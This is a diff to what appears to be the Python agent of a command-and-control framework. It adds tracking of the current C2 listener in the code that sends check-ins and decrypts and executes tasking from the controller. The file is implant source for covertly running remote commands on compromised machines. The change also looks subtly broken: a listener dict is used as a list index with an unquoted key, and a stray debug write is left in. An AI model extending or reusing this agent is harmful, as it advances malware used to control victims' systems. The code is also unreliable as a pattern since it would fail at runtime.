@@ -81,8 +81,11 @@ listeners = [
 #def myfunc(data):
 #    #try to send data to listener example_listener
 
+curlistener = ''
+
 def send_message(data = None):
     global listeners
+    global curlistener
 
     #Calls each listener in turn to try and send data back
     #to C2. Only increases missedcheckins once every one has been tried
@@ -116,6 +119,7 @@ def send_message(data = None):
             if data == base64.b64decode(listener['defaultResponse']):
                 listener['missedCheckins'] = 0
             else:
+                curlistener = listener
                 decode_routing_packet(data)
 
             break           
@@ -234,6 +238,9 @@ def process_tasking(data):
     #   -decrypts/verifies the response to get
     #   -extracts the packets and processes each
 
+    global curlistener
+    global listeners
+
     try:
         # aes_decrypt_and_verify is in stager.py
         tasking = aes_decrypt_and_verify(key, data)
@@ -248,7 +255,8 @@ def process_tasking(data):
             fh.write("curlistener missedcheckins")
 
         # if we get to this point, we have a legit tasking so reset missedCheckins
-        missedCheckins = 0
+
+        listeners[curlistener][missedCheckins] = 0
 
         # execute/process the packets and get any response
         resultPackets = ""
